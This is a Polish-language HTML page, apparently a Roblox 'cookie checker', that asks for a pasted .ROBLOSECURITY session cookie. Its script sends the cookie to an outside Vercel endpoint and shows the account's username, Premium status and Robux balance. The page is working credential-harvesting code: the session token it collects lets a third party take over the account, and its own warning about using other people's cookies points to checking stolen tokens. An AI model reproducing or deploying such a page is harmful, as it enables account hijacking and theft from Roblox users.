<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox – nazwa z .ROBLOSECURITY</title>
  <style>
    body { 
      font-family: Arial, sans-serif; 
      max-width: 600px; 
      margin: 40px auto; 
      padding: 20px; 
      background: #111; 
      color: #eee; 
    }
    textarea { 
      width: 100%; 
      height: 140px; 
      background: #222; 
      color: #eee; 
      border: 1px solid #444; 
      padding: 12px; 
      font-family: monospace; 
      resize: vertical;
    }
    button { 
      padding: 14px 32px; 
      background: #1e90ff; 
      border: none; 
      color: white; 
      font-size: 17px; 
      cursor: pointer; 
      margin: 15px 0; 
      border-radius: 4px;
    }
    button:hover { 
      background: #0c7ae6; 
    }
    #result { 
      margin-top: 25px; 
      padding: 20px; 
      background: #1a1a1a; 
      border: 1px solid #444; 
      border-radius: 8px; 
      min-height: 120px; 
      line-height: 1.6;
    }
    .error { color: #ff4d4d; }
    .success { color: #00ff9d; }
    b { color: #ddd; }
  </style>
</head>
<body>

<h2>Pobierz nazwę użytkownika Roblox z cookie</h2>

<p style="color:#ffcc00; font-weight:bold;">
  <strong>OSTRZEŻENIE:</strong> używanie cudzych cookie jest niezgodne z regulaminem Roblox i może skutkować banem
</p>

<textarea id="cookie" placeholder="Wklej tutaj sam ciąg .ROBLOSECURITY (bez '.ROBLOSECURITY=')"></textarea>

<br>
<button onclick="sprawdz()">Sprawdź</button>

<div id="result"></div>

<script>
async function sprawdz() {
  const cookieVal = document.getElementById('cookie').value.trim();
  const result = document.getElementById('result');
  result.innerHTML = '';

  if (cookieVal.length < 200) {
    result.innerHTML = '<span class="error">Wklej poprawne cookie! (zbyt krótki ciąg)</span>';
    return;
  }

  result.innerHTML = '<i>Proszę czekać... trwa weryfikacja</i>';

  try {
    const resp = await fetch('https://checker-alpha-pink.vercel.app/api/get-username', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie: cookieVal })
    });

    const json = await resp.json();

    if (json.error) {
      result.innerHTML = `<span class="error">Błąd: ${json.error}</span>`;
      return;
    }

    if (json.success) {
      result.innerHTML = `
        <span class="success">Zalogowano pomyślnie!</span><br><br>

        <b>Nazwa użytkownika:</b> ${json.username}<br>
        <b>Display Name:</b> ${json.displayName}<br>
        <b>User ID:</b> ${json.userId}<br>
        <b>Roblox Premium:</b> 
          <span style="color: ${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">
            ${json.hasPremium ? 'TAK ✓' : 'NIE ✗'}
          </span><br>
        <b>Robux na koncie:</b> 
          <span style="color: #ffcc00; font-weight: bold;">
            ${json.robux.toLocaleString('pl-PL')} Robux
          </span>
      `;
    } else {
      result.innerHTML = '<span class="error">Nieznana odpowiedź serwera</span>';
    }
  } catch (e) {
    result.innerHTML = `<span class="error">Błąd połączenia: ${e.message}</span>`;
  }
}
</script>

</body>
</html>
